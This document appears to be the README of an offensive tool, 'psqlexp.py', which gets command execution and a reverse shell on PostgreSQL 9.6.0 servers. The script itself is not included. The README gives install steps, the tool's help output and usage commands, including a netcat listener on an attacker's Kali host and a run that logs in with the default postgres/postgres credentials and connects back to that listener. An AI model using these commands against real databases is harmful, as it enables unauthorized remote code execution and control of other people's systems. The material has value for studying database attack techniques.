# Postgre SQL RCE and Reverse Shell

Tested on PostgreSQL DB 9.6.0

## Install psycopg2
```bash
$ sudo apt-get install python3-psycopg2
```
**Help**

```
usage: psqlexp.py [-h] [-T TARGET] [-p PORT] [-U USERNAME] [-P PASSWORD]
                  [--lhost LHOST] [--lport LPORT] [--cmd] [--os-shell]

optional arguments:
  -h, --help            show this help message and exit
  -T, --target   	The target host
  -p, --port  		The target port
  -U, --username	The application Username
  -P, --password        The password fo the user
  --lhost               Local host to connect back
  --lport               Local port to connect back
  --cmd                 Command execution on target
  --os-shell            Get reverse shell from the target
```

## Usage
**Run command on target**

```bash
$ python3 psqlexp.py -T TARGET_IP -p 5432 -U postgres -P postgres --cmd
psqlexp# <custom command>
```

**Get Reverse shell from target**

```bash
[KALI]$ nc -lvnp 8080

$ python3 psqlexp.py -T TARGET_IP -p 5432 -U postgres -P postgres --lhost LOCAL_IP --lport 8080 --os-shell
```


# Future Developement
 - Add File read and Write Capability
 - Add UDF hack support
